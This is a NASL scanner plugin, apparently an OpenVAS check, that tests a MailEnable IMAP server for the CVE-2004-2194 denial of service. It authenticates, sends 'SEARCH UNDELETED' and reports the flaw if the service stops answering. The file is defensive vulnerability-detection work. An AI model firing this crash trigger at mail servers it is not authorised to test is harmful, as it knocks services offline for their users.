# SPDX-FileCopyrightText: 2005 George A. Theall
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:mailenable:mailenable";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.15487");
  script_version("2023-05-11T09:09:33+0000");
  script_tag(name:"last_modification", value:"2023-05-11 09:09:33 +0000 (Thu, 11 May 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");

  script_cve_id("CVE-2004-2194");
  script_xref(name:"OSVDB", value:"10728");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("MailEnable < 1.5e IMAP Service Search DoS Vulnerability - Active Check");

  script_category(ACT_DENIAL);

  script_copyright("Copyright (C) 2004 George A. Theall");
  script_family("Denial of Service");
  script_dependencies("gb_mailenable_consolidation.nasl", "logins.nasl");
  script_require_ports("Services/imap", 143);
  script_mandatory_keys("mailenable/imap/detected", "imap/login", "imap/password");

  script_tag(name:"summary", value:"MailEnable is prone to a denial of service (DoS) vulnerability
  in IMAP when receiving a SEARCH command.");

  script_tag(name:"vuldetect", value:"Sends a crafted IMAP request and checks if the service is
  still responding.");

  script_tag(name:"solution", value:"Upgrade to MailEnable Professional 1.5e or later.");

  script_tag(name:"impact", value:"An authenticated user could send this command either on purpose as
  a denial of service attack or unwittingly since some IMAP clients, such as IMP and Vmail, use it as
  part of the normal login process.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/11418");

  exit(0);
}

include("host_details.inc");
include("imap_func.inc");
include("misc_func.inc");

kb_creds = imap_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];
if (!user || !pass)
  exit(0);

if (!port = get_app_port(cpe: CPE, service: "imap"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

s = recv_line(socket: soc, length: 1024);
s = chomp(s);
if (!s || "IMAP4rev1 server ready at" >!< s) {
  close(soc);
  exit(0);
}

tag = 0;

++tag;
# nb: MailEnable supports the obsolete LOGIN SASL mechanism, which I'll use.
c = string("a", string(tag), " AUTHENTICATE LOGIN");

send(socket: soc, data: string(c, "\r\n"));
s = recv_line(socket: soc, length: 1024);
s = chomp(s);

if (s =~ "^\+ ") {
  s = s - "+ ";
  s = base64_decode(str: s);
  if ("User Name" >< s) {
    c = base64(str: user);

    send(socket: soc, data: string(c, "\r\n"));
    s = recv_line(socket: soc, length: 1024);
    s = chomp(s);

    if (s =~ "^\+ ") {
      s = s - "+ ";
      s = base64_decode(str: s);
    }
    if ("Password" >< s) {
      c = base64(str: pass);
      send(socket: soc, data: string(c, "\r\n"));
    }
  }
}

while (s = recv_line(socket: soc, length: 1024)) {
  s = chomp(s);
  m = eregmatch(pattern: string("^a", string(tag), " (OK|BAD|NO)"), string: s, icase: TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
  resp = '';
}

# If successful, select the INBOX.
if (resp && resp =~ "OK") {
  ++tag;
  c = string("a", string(tag), " SELECT INBOX");
  send(socket: soc, data: string(c, "\r\n"));
  while (s = recv_line(socket: soc, length: 1024)) {
    s = chomp(s);
    m = eregmatch(pattern: string("^a", string(tag), " (OK|BAD|NO)"), string: s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
    resp = '';
  }

  # If successful, search it.
  if (resp && resp =~ "OK") {
    ++tag;
    c = string("a", string(tag), " SEARCH UNDELETED");
    send(socket: soc, data: string(c, "\r\n"));
    while (s = recv_line(socket: soc, length: 1024)) {
      s = chomp(s);
      m = eregmatch(pattern: string("^a", string(tag), " (OK|BAD|NO)"), string: s, icase: TRUE);
      if (!isnull(m)) {
        resp = m[1];
        break;
      }
      resp = '';
    }

    # If we don't get a response, make sure the service is truly down.
    if (!resp) {
      close(soc);
      soc = open_sock_tcp(port);
      if (!soc) {
        security_message(port: port);
        exit(0);
      }
    }
  }
}

# Logout.
++tag;
c = string("a", string(tag), " LOGOUT");
send(socket: soc, data: string(c, "\r\n"));
while (s = recv_line(socket: soc, length: 1024)) {
  s = chomp(s);
  m = eregmatch(pattern: string("^a", string(tag), " (OK|BAD|NO)"), string: s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
}
close(soc);
exit(99);
